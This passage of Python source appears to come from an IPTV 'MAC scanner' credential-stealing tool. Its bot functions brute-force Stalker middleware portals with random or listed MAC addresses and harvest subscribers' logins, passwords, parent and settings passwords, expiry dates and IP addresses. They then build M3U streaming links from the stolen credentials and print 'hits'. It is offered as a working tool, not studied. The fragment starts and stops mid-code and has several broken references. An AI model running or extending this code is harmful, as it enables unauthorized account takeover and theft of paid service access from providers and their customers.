╔═════★☆𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐋𝐞𝐠𝐞𝐧𝐝☆★═════ 
╠═ 𝐂𝐎𝐃𝐄 𝐁𝐘 𝐆𝐑𝐀𝐇𝐀𝐌 𝐖𝐀𝐋𝐊𝐄𝐑
╠═  ★☆𝐋𝐄𝐆𝐄𝐍𝐃𝐒 𝐍𝐄𝐕𝐄𝐑 𝐃𝐈𝐄☆★   
║
╠═❱❱❱ Hits By """ + str(nickn) + """
╠═❱❱❱ Host  http://""" + str(panell) + """/c/
╠═❱❱❱ Real http://""" + str(reall) + """
╠═❱❱❱ Portal Type """ + str(load) + """
╠═❱❱❱ Mac """ + str(mac) + """
╠═❱❱❱ Expires """ + str(trh) + """
╠═❱❱❱ VPN Status """ + str(state) + """
╠═❱❱❱ M3U """ + str(m3ustat) + """
╠═❱❱❱ VPN """ + str(vpn) + """
╠═❱❱❱ Region """ + str(country_name) + """ """ + data_server(str(scountry)) + """
║
╚═══════════★☆☆★═════════
"""

    sifre = device(mac)
    if channelcat != "3":
        imza = imza + sifre

    if channelcat == "1" or channelcat == "2":
        imza = imza + """ 

╔═════Channel List
╚══★""" + str(livelist) + """ """
    if channelcat == "2":
        imza = imza + """  
╔═════Film List
╚══★""" + str(vodlist) + """ 
╔═════Series List
╚══★""" + str(serieslist) + """
    """
        # SEND_URL = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={kimza}"
        # requests.get(SEND_URL)
    if len(numberofchannels) > 1 and channelcat != "3":
        imza = imza + """
╔═❱❱❱ Channels """ + numberofchannels + """
╠═❱❱❱ Movies """ + numberofmovies + """
╚═❱❱❱ Series """ + numberofseries + """ 
"""
    pimza = """
╔═❱❱❱ M3U Real """ + str(m3ulink) + """ """ + str(playerapi) + """
╚═❱❱❱ M3U Host """ + str(m3uhost) + """
 
    """
    if channelcat != "3":
        imza = imza + pimza
    if channelcat == "3":
        imza = kimza

    imza = imza
    fsph(imza)
    hitsay = hitsay + 1
    print(imza)
    if hitsay >= hitc:
        hitr = "\33[1;33m"


def data_server(scountry):
    flag = ''
    country = ''
    origen = ''
    try:
        countrycode = scountry
        flag = flag.flag(countrycode)
        origen = flag
    except:
        pass
    return origen


def device(mac):
    mac = mac.upper()
    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
    SNENC = SN.upper()  #SN
    SNCUT = SNENC[:13]  #Sncut
    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
    DEVENC = DEV.upper()  #dev1
    DEV1 = hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
    DEVENC1 = DEV1.upper()  #dev2
    SG = SNCUT + '+' + (mac)
    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
    SINGENC = SING.upper()
    sifre = """
╔═❱❱❱ Device Info
╠═❱❱❱ Serial """ + SNENC + """   
╠═❱❱❱ Serial Cut """ + SNCUT + """
╠═❱❱❱ Device ID1 """ + DEVENC + """
╠═❱❱❱ Device ID2 """ + SINGENC + """
╚═❱❱❱ Signature """ + DEVENC1 + """
"""
    return sifre


color = ""
cpm = 0
cpmx = 0
hitr = "\33[1;33m"
m3uon = 0
m3uvpn = 0
macon = 0
macvpn = 0


def echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr):
    global macv, cpmx
    global maca, attack, color
    global cpm, m3uon, m3uvpn, macvpn, macon, bib
    try:
        cpmx = (time.time() - cpm)
        cpmx = (round(60 / cpmx))
    except Exception:
        cpm = cpmx
    if str(cpmx) == "0":
        cpm = cpm
    else:
        cpm = cpmx
    echo = ("""
╭──● \33[1;94mHits By """ + str(nickn) + """  \33[0m
├──● Time\33[0m \33[36m""" + str(time.strftime("%d.%m.%Y - %H:%M:%S")) + """ \33[0m
├──●\33[91m Attack Type\33[97m""" + str(attack) + """\33[0m
├──●  \33[1;36m Portal\33[97m """ + str(load) + """\33[0m
├──● \33[91m|HTTP| """ + color + str(status_code) + """\33[0m
├──●  \33[36m Target \33[34m """ + str(panel) + """ \33[0m
├──● \33[0mMacCheck  \33[92mNoVpn """ + str(macon) + """ \33[0m \33[91mVPN """ + str(macvpn) + """   \33[0m
├──● \33[0mM3uCheck  \33[92mActive """ + str(m3uon) + """ \33[0m \33[91mOFF """ + str(m3uvpn) + """   \33[0m
├──● \33[0mExpired Hits Bypassed: \33[91m """+ str (expired_hits_bypassed) + """ \33[0m
├──● """ + tokenr + str(mac) + """ \33[1;36mHit = \33[97m\33[33m""" + str(hitr) + str(hitc) + """\33[0m
├──●\33[1;36m Progress \33[97m""" + str(oran) + """%  \33[1;36mCPM = \33[97m""" + str(cpm) + """  \33[0m
├──●  \33[1;94mCombo Selected\33[97m  """ + str(fileas) + """
╰──● \33[96m""" + str(bot) + """  \33[95m Total Run = \33[97m""" + str(total) + """ \33[0m""")

    print("\33[H\33[J", end="")
    print(echo, end="", flush=True)
    time.sleep(0.01)
    cpm = time.time()
    if status_code == 200:
        color = Fore.GREEN + "ᴀᴠᴀɪʟᴀʙʟᴇ : "
    elif status_code == 301:
        color = Fore.LIGHTRED_EX + "ʀᴇᴅɪʀᴇᴄᴛ : "
    elif status_code == 302:
        color = Fore.LIGHTRED_EX + "ᴍᴏᴠᴇᴅ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ : "
    elif status_code == 401:
        color = Fore.RED + "ᴜɴᴀᴜᴛʜᴏʀɪꜱᴇᴅ : "
    elif status_code == 403:
        color = Fore.RED + "ꜰᴏʀʙɪᴅᴅᴇɴ : "
    elif status_code == 404:
        color = "\33[38;5;202m" + "ɴᴏᴛ ꜰᴏᴜɴᴅ : "
    elif status_code == 407:
        color = "\33[38;5;003m" + "ᴘʀᴏxʏ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ ʀᴇQᴜɪʀᴇᴅ : "
    elif status_code == 429:
        color = Fore.LIGHTYELLOW_EX + "ᴛᴏ ᴍᴀɴʏ ʀᴇQᴜᴇꜱᴛꜱ  : "
    elif status_code == 500:
        color = Fore.LIGHTRED_EX + "sᴇʀᴠᴇʀ Eʀʀᴏʀ : "
    elif status_code == 503:
        color = Fore.YELLOW + "ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ : "
    elif status_code == 512:
        color = Fore.LIGHTMAGENTA_EX + "ᴇʀʀᴏʀ : "
    elif status_code == 520:
        color = Fore.MAGENTA + "ᴜɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ : "
    else:
        color = "\33[0m"


def vpnip(ip):
    global country_name
    url9 = "https://freegeoip.app/json/" + ip
    vpnip = ""
    vpn = "ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
    data = ""
    try:
        res = option.get(url9, timeout=7, verify=False)
        data = str(res.text)
    except:
        vpn = "ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
    if not "404 page" in data1:
        if "country_name" in data1:
            vpnc = data.split('city": "')[-1]
            vpnc = vpnc.split('"')[0]
            vpncc = data.split('country_code": "')[-1]
            vpncc = vpncc.split('"')[0]
            vpnips = data.split('country_name": "')[-1]
            vpnips = vpnips.split('"')[0]
            flagc = flag.flag(vpncc)
            vpn = vpnips + "  " + flagc + " " + vpnc
    else:
        vpn = "ɴᴏᴛ ɪɴᴠᴀʟɪᴅ"
    return vpn


def image(link):
    global maca  # try:
    try:
        res = option.get(link, headers=hea3(), timeout=(2, 5), allow_redirects=False, stream=True)
        state = "VPN「 ACTIVE 」🔒✔ "
        if res.status_code == 302 or res.status_code == 406:
            state = " ✅😎 "
    except:
        state = "VPN 「ᴜsᴇ ᴠᴘɴ」🔒✔ "
    if state == " ✅😎 ":
        maca = maca + 1
    else:
        pass
    return state


tokenr = "\33[0m"


def hitprint(mac, trh):
    # playsound(rootDir + '/Python_Portable/settings/sounds/retrojump.mp3')
    file = pathlib.Path()
    # try:
    #     if file.exists():
    #         ad.mediaPlay()
    #
    # except:
    #     pass
    print('\n\33[1;43m     🌟 🌟 🇭 🇮 🇹 🌟 🌟    \33[0m  \n  ' + str(mac) + '\n  ' + str(trh))


def list(listlink, macs, token, livel):
    category = ""
    data = ""
    trys = 0
    while True:
        try:
            res = option.get(listlink, headers=hea2(macs, token), timeout=15, verify=False)
            data = str(res.text)
            break
        except:
            trys = trys + 1
            time.sleep(1)
            if trys == 12:
                break

    if data.count('title":"') > 1:
        for i in data.split('title":"'):
            try:
                channel = ""
                channel = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace(r'\/', '/')
            except:
                pass
            category = category + channel + livel

    list = category
    return list


def m3ustatus(cid, user, pas, plink):  # playerlink test swap
    state = "ᴏꜰꜰʟɪɴᴇ  "
    try:
        url = f"{http}{plink}live{user}'/'{pas}'/'{cid}ts"  #  playerlink as above
        res = option.get(url, headers=hea3(), timeout=(2, 5), allow_redirects=False, stream=True)
        if res.status_code == 302 or res.status_code == 406:
            state = "ᴏɴʟɪɴᴇ ✅"
    except:
        state = "ᴏꜰꜰʟɪɴᴇ  "
    return state


def m3uapi(playerlink, mac, token):
    mt = ""
    trys = 0
    data1 = ""
    bad = 0
    while True:
        try:
            res = option.get(playerlink, headers=hea2(mac, token), timeout=20, verify=False)
            data1 = str(res.text)
            break
        except:
            bad = bad + 1
            if bad == 3:
                break
    if data1 == "" or "404" in data1:
        bad = 0
        while True:
            try:
                playerlink = playerlink.replace("player_api.php", "panel_api.php")
                res = option.get(playerlink, headers=hea2(mac, token), timeout=20, verify=False)
                data1 = str(res.text)
                break
            except:
                bad = bad + 1
                if bad == 3:
                    break


def unicode(fyz):
    cod = fyz.encode('utf-8').decode("unicode-escape").replace(r'\/', '/')
    return cod


def fix_me2(data, vr):
    data1 = ""
    try:
        data1 = data.split('"' + str(vr) + '":"')[1]
        data1 = data1.split('"')[0]
        data1 = data1.replace('"', '')
        data1 = unicode(data1)
    except:
        pass
    return str(data1)


def d1():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(1, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_01"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            #print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d2():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(2, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_02"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
